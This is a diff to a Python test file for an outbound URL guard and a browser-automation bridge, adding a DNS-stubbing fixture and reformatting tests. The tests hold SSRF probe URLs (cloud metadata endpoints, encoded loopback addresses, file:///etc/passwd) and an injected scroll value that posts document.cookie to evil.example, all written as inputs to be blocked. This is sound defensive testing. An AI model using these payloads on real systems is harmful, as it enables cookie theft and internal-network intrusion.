@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import pytest
 
+from app.core import url_guard
 from app.core.config import get_settings
 from app.core.url_guard import check_outbound_url
 from app.services.awi_playwright_bridge import AWIPlaywrightBridge, BridgeSession
@@ -29,6 +30,16 @@ def bridge():
 @pytest.fixture
 def session():
     return BridgeSession(session_id="test-session", current_url="https://example.com")
+
+
+@pytest.fixture
+def public_documentation_dns(monkeypatch):
+    """Keep public-host assertions independent of local DNS interception."""
+
+    async def resolve(_host):
+        return [(None, None, None, None, ("93.184.216.34", 0))]
+
+    monkeypatch.setattr(url_guard, "_resolve_host", resolve)
 
 
 class TestOutboundUrlGuard:
@@ -47,7 +58,10 @@ class TestOutboundUrlGuard:
             ("http://169.254.169.254/latest/meta-data/", "private_address_blocked"),
             ("http://[::1]:6379/", "private_address_blocked"),
             ("http://localhost:8080/", "private_host_blocked"),
-            ("http://metadata.google.internal/computeMetadata/", "private_host_blocked"),
+            (
+                "http://metadata.google.internal/computeMetadata/",
+                "private_host_blocked",
+            ),
             ("http://foo.internal/", "private_host_blocked"),
         ],
     )
@@ -55,19 +69,19 @@ class TestOutboundUrlGuard:
         assert await check_outbound_url(url) == reason
 
     @pytest.mark.anyio
-    async def test_public_https_url_is_allowed(self):
+    async def test_public_https_url_is_allowed(self, public_documentation_dns):
         assert await check_outbound_url("https://example.com/page") is None
 
     @pytest.mark.anyio
     @pytest.mark.parametrize(
         "url",
         [
-            "http://2130706433/",              # decimal-encoded 127.0.0.1
-            "http://0x7f000001/",              # hex-encoded 127.0.0.1
-            "http://017700000001/",            # octal-encoded 127.0.0.1
-            "http://0/",                       # 0.0.0.0
+            "http://2130706433/",  # decimal-encoded 127.0.0.1
+            "http://0x7f000001/",  # hex-encoded 127.0.0.1
+            "http://017700000001/",  # octal-encoded 127.0.0.1
+            "http://0/",  # 0.0.0.0
             "http://evil.example.com@127.0.0.1/",  # userinfo confusion
-            "http://[::ffff:169.254.169.254]/",    # ipv6-mapped metadata
+            "http://[::ffff:169.254.169.254]/",  # ipv6-mapped metadata
         ],
     )
     async def test_ip_encoding_tricks_are_blocked(self, url):
@@ -76,7 +90,7 @@ class TestOutboundUrlGuard:
         assert await check_outbound_url(url) == "private_address_blocked"
 
     @pytest.mark.anyio
-    async def test_userinfo_does_not_mask_a_public_host(self):
+    async def test_userinfo_does_not_mask_a_public_host(self, public_documentation_dns):
         # Here the real host is the public one; the loopback string is only
         # userinfo and must not trigger a false block.
         assert await check_outbound_url("http://127.0.0.1@example.com/") is None
@@ -87,9 +101,7 @@ class TestOutboundUrlGuard:
     ):
         monkeypatch.setattr(get_settings(), "ALLOW_PRIVATE_NETWORK_TARGETS", True)
         assert await check_outbound_url("http://127.0.0.1:8000/") is None
-        assert (
-            await check_outbound_url("file:///etc/passwd") == "scheme_not_allowed"
-        )
+        assert await check_outbound_url("file:///etc/passwd") == "scheme_not_allowed"
 
 
 class TestAWIScrollInjection:
@@ -98,8 +110,10 @@ class TestAWIScrollInjection:
         with pytest.raises(ValueError, match="integer"):
             await bridge._handle_scroll(
                 session,
-                {"amount": "300); fetch('https://evil.example', "
-                 "{method:'POST', body: document.cookie}); (0"},
+                {
+                    "amount": "300); fetch('https://evil.example', "
+                    "{method:'POST', body: document.cookie}); (0"
+                },
             )
 
     @pytest.mark.anyio
@@ -128,7 +142,9 @@ class TestAWINavigationGuard:
             await bridge._handle_navigate_to(session, {"url": url})
 
     @pytest.mark.anyio
-    async def test_navigate_to_allows_public_url(self, bridge, session):
+    async def test_navigate_to_allows_public_url(
+        self, bridge, session, public_documentation_dns
+    ):
         commands = await bridge._handle_navigate_to(
             session, {"url": "https://example.com/products"}
         )
